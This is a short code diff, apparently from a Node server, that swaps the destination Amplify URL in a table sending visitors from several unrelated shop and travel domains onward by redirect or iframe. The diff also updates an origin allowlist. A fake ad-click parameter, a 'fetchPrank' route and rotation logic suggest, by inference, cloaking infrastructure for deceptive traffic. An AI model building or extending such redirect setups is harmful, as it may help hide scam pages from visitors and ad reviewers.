@@ -85,17 +85,17 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://naotoshidairy.shop": { method: "redirect", target: "https://main.d3662653ynotsk.amplifyapp.com" },
-    "https://takahirofarmfood.com": { method: "redirect", target: "https://main.d3662653ynotsk.amplifyapp.com" },
-    "https://hiroakitravels.com": { method: "redirect", target: "https://main.d3662653ynotsk.amplifyapp.com" },
+    "https://naotoshidairy.shop": { method: "redirect", target: "https://main.d1bj4xqmk4jju.amplifyapp.com" },
+    "https://takahirofarmfood.com": { method: "redirect", target: "https://main.d1bj4xqmk4jju.amplifyapp.com" },
+    "https://hiroakitravels.com": { method: "redirect", target: "https://main.d1bj4xqmk4jju.amplifyapp.com" },
   },
   dmc: {
     // "https://middlepage.onrender.com/?gclid=twygyuewewewgvehwwhdwdwhdjwdhgwdsuidwdwd": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
-    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://main.d3662653ynotsk.amplifyapp.com" },
-    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://main.d3662653ynotsk.amplifyapp.com" },
+    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://main.d1bj4xqmk4jju.amplifyapp.com" },
+    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://main.d1bj4xqmk4jju.amplifyapp.com" },
   },
   aomine: {
-    "https://venerable-fenglisu-db94d4.netlify.app": { method: "redirect", target: "https://main.d3662653ynotsk.amplifyapp.com" },
+    "https://venerable-fenglisu-db94d4.netlify.app": { method: "redirect", target: "https://main.d1bj4xqmk4jju.amplifyapp.com" },
   },
 };
 
@@ -674,7 +674,7 @@ app.get("/fetchPrank", (req, res) => {
 function isAuthorized(req) {
   // Replace with whatever "who is requesting" check you want.
   // Simple Netlify-origin allowlist:
-  const allowed = ["https://main.d3662653ynotsk.amplifyapp.com"];
+  const allowed = ["https://main.d1bj4xqmk4jju.amplifyapp.com"];
   return allowed.includes(req.get("origin"));
 }
 
